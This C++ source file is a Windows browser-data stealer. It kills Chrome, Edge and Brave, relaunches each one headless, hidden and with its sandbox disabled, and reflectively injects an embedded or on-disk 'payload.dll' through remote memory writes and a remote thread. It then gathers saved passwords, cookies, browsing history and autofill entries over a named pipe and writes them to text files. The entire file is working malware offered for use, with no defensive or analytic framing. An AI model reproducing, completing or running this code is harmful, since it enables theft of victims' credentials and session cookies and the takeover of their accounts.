#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
#include <fstream>
#include <filesystem>
#include <cctype>
#include <cwctype>
#include "bootstrapper.h"
#include "json.hpp"

using json = nlohmann::json;
namespace fs = std::filesystem;

// --- BURAYA BASE64 ENCODED DLL VERİSİNİ YAPIŞTIRIN ---
const std::string EMBEDDED_DLL_BASE64 = "";

static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::vector<unsigned char> ret;

    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }

    return ret;
}

struct BrowserConfig {
    std::wstring name;
    std::wstring exe_name;
    std::vector<std::wstring> common_paths;
};

const std::vector<BrowserConfig> BROWSERS = {
    {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}},
    {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}},
    {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}}
};

std::wstring find_browser_exe(const std::wstring& name) {
    for (const auto& b : BROWSERS) {
        std::wstring b_name_lower = b.name;
        std::wstring target_name_lower = name;
        std::transform(b_name_lower.begin(), b_name_lower.end(), b_name_lower.begin(), ::towlower);
        std::transform(target_name_lower.begin(), target_name_lower.end(), target_name_lower.begin(), ::towlower);
        if (b_name_lower == target_name_lower) {
            for (const auto& path : b.common_paths) {
                if (fs::exists(path)) return path;
            }
        }
    }
    return L"";
}

void kill_processes_by_name(const std::wstring& exe_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            std::wstring current_exe = entry.szExeFile;
            std::wstring exe_name_lower = exe_name;
            std::wstring current_exe_lower = current_exe;
            std::transform(exe_name_lower.begin(), exe_name_lower.end(), exe_name_lower.begin(), ::towlower);
            std::transform(current_exe_lower.begin(), current_exe_lower.end(), current_exe_lower.begin(), ::towlower);

            if (current_exe_lower == exe_name_lower) {
                HANDLE h_process = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                if (h_process) {
                    TerminateProcess(h_process, 0);
                    CloseHandle(h_process);
                }
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
}

void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)dll_bytes.data();
    IMAGE_NT_HEADERS64* nt_headers = (IMAGE_NT_HEADERS64*)(dll_bytes.data() + dos_header->e_lfanew);

    size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    void* preferred_base = (void*)nt_headers->OptionalHeader.ImageBase;

    void* remote_base = VirtualAllocEx(h_process, preferred_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    bool relocation_required = false;

    if (!remote_base) {
        relocation_required = true;
        remote_base = VirtualAllocEx(h_process, NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_base) return;

    WriteProcessMemory(h_process, remote_base, dll_bytes.data(), nt_headers->OptionalHeader.SizeOfHeaders, NULL);

    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)((size_t)nt_headers + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (sections[i].PointerToRawData == 0 || sections[i].SizeOfRawData == 0) continue;
        void* remote_section = (void*)((size_t)remote_base + sections[i].VirtualAddress);
        void* local_section = (void*)(dll_bytes.data() + sections[i].PointerToRawData);
        WriteProcessMemory(h_process, remote_section, local_section, sections[i].SizeOfRawData, NULL);
    }

    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");
    DllInfo dll_info = {
        remote_base,
        (LoadLibraryA_t)GetProcAddress(h_kernel32, "LoadLibraryA"),
        (GetProcAddress_t)GetProcAddress(h_kernel32, "GetProcAddress"),
        relocation_required
    };

    size_t bootstrapper_size = (size_t)realign_pe_end - (size_t)realign_pe;
    if (bootstrapper_size == 0) bootstrapper_size = 4096;

    size_t total_size = sizeof(DllInfo) + bootstrapper_size;
    void* remote_bootstrap = VirtualAllocEx(h_process, NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(h_process, remote_bootstrap, &dll_info, sizeof(DllInfo), NULL);
    void* remote_code = (void*)((size_t)remote_bootstrap + sizeof(DllInfo));
    WriteProcessMemory(h_process, remote_code, (void*)realign_pe, bootstrapper_size, NULL);

    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)remote_code, remote_bootstrap, 0, NULL);
    if (h_thread) {
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    }
}

void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& browser) {
    std::wcout << L"\n--- Processing Browser: " << browser.name << L" ---" << std::endl;

    kill_processes_by_name(browser.exe_name);

    std::wstring cmd = browser.exe_name + L" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
    std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
    cmd_buf.push_back(0);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = { 0 };

    BOOL success = CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!success) {
        std::wstring path = find_browser_exe(browser.name);
        if (!path.empty()) {
            std::wstring full_cmd = L"\"" + path + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
            std::vector<wchar_t> full_cmd_buf(full_cmd.begin(), full_cmd.end());
            full_cmd_buf.push_back(0);
            success = CreateProcessW(NULL, full_cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        }
    }

    if (!success) {
        std::wcerr << L"Failed to create " << browser.exe_name << L" process" << std::endl;
        return;
    }

    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL);
    if (h_pipe == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create named pipe. Error: " << GetLastError() << std::endl;
    }

    inject_dll_reflective(pi.hProcess, dll_bytes);
    ResumeThread(pi.hThread);

    if (h_pipe != INVALID_HANDLE_VALUE) {
        std::cout << "Waiting for DLL connection..." << std::endl;
        if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            std::cout << "DLL Connected successfully!" << std::endl;
            std::vector<char> buffer;
            char temp[65536];
            DWORD bytes_read;
            while (ReadFile(h_pipe, temp, sizeof(temp), &bytes_read, NULL) && bytes_read > 0) {
                buffer.insert(buffer.end(), temp, temp + bytes_read);
            }

            if (!buffer.empty()) {
                std::cout << "Received " << buffer.size() << " bytes of data." << std::endl;
                try {
                    std::cout << "Parsing JSON data..." << std::endl;
                    auto profiles = json::parse(buffer);
                    fs::path browser_dir(browser.name);
                    fs::create_directories(browser_dir);

                    for (size_t i = 0; i < profiles.size(); ++i) {
                        std::string p_name = profiles[i]["name"].get<std::string>();
                        // Sanitize profile name for filesystem
                        std::replace(p_name.begin(), p_name.end(), '/', '_');
                        std::replace(p_name.begin(), p_name.end(), '\\', '_');
                        std::replace(p_name.begin(), p_name.end(), ':', '_');

                        fs::path profile_dir = browser_dir / p_name;
                        fs::create_directories(profile_dir);

                        std::string p_pass = (profile_dir / "passwords.txt").string();
                        std::ofstream pass_file(p_pass);
                        for (auto& p : profiles[i]["passwords"]) {
                            pass_file << "URL: " << p["url"].get<std::string>() << "\nUser: " << p["username"].get<std::string>() << "\nPass: " << p["password"].get<std::string>() << "\n\n";
                        }
                        pass_file.close();

                        std::string p_cook = (profile_dir / "cookies.txt").string();
                        std::ofstream cookie_file(p_cook);
                        for (auto& c : profiles[i]["cookies"]) {
                            cookie_file << "Host: " << c["host"].get<std::string>() << " | Name: " << c["name"].get<std::string>() << " | Value: " << c["value"].get<std::string>() << "\n";
                        }
                        cookie_file.close();

                        std::string p_hist = (profile_dir / "history.txt").string();
                        std::ofstream hist_file(p_hist);
                        for (auto& h : profiles[i]["history"]) {
                            hist_file << "URL: " << h["url"].get<std::string>() << " | Title: " << h["title"].get<std::string>() << " | Visits: " << h["visit_count"].get<int>() << "\n";
                        }
                        hist_file.close();

                        std::string p_auto = (profile_dir / "autofill.txt").string();
                        std::ofstream auto_file(p_auto);
                        for (auto& a : profiles[i]["autofill"]) {
                            auto_file << "Name: " << a["name"].get<std::string>() << " | Value: " << a["value"].get<std::string>() << "\n";
                        }
                        auto_file.close();

                        std::cout << "[+] Saved " << profiles[i]["passwords"].size() << " passwords to: " << p_pass << std::endl;
                        std::cout << "[+] Saved " << profiles[i]["cookies"].size() << " cookies to: " << p_cook << std::endl;
                    }
                } catch (const std::exception& e) {
                    std::cerr << "JSON Parsing error: " << e.what() << std::endl;
                } catch (...) {
                    std::cerr << "Unknown error during JSON parsing." << std::endl;
                }
            } else {
                std::cout << "Pipe closed with no data received." << std::endl;
            }
        } else {
            std::cerr << "ConnectNamedPipe failed. Error: " << GetLastError() << std::endl;
        }
        CloseHandle(h_pipe);
    }

    Sleep(1000); // Give the OS time to finish pipe work
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main(int argc, char* argv[]) {
    std::string browser_choice = "all";
    if (argc > 1) {
        std::string arg1 = argv[1];
        if (arg1 == "-b" || arg1 == "--browser") {
            if (argc > 2) browser_choice = argv[2];
        }
    }

    std::vector<unsigned char> dll_bytes;
    if (!EMBEDDED_DLL_BASE64.empty()) {
        dll_bytes = base64_decode(EMBEDDED_DLL_BASE64);
    } else {
        std::ifstream file("payload.dll", std::ios::binary);
        if (file) {
            dll_bytes = std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        }
    }

    if (dll_bytes.empty()) {
        std::cerr << "DLL not found (embedded or payload.dll)" << std::endl;
        return 1;
    }

    for (const auto& config : BROWSERS) {
        std::string name_lower(config.name.begin(), config.name.end());
        std::transform(name_lower.begin(), name_lower.end(), name_lower.begin(), ::tolower);
        if (browser_choice == "all" || browser_choice == name_lower) {
            inject_and_collect(dll_bytes, config);
        }
    }

    return 0;
}
